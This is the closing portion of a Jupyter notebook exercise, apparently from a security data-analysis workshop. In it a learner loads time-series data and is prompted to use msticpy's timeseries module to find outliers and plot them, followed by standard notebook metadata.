     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load test data\n",
    "ts_df = pd.read_pickle('data/timeseries.pkl')\n",
    "ts_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:28:22.664592Z",
     "start_time": "2022-10-18T09:28:22.640775Z"
    }
   },
   "outputs": [],
   "source": [
    "#load the module\n",
    "from msticpy.analysis import timeseries\n",
    "\n",
    "# analyze the time series data and find outliers\n",
    "ts_decomp_df = "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:28:52.974627Z",
     "start_time": "2022-10-18T09:28:52.794512Z"
    }
   },
   "outputs": [],
   "source": [
    "# plot the results retrieved from previous step."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "# End of Session\n"
   ]
  }
 ],
 "metadata": {
  "hide_input": false,
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  },
  "vscode": {
   "interpreter": {
    "hash": "0f1a8e166ce5c1ec1911a36e4fdbd34b2f623e2a3442791008b8ac429a1d6070"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
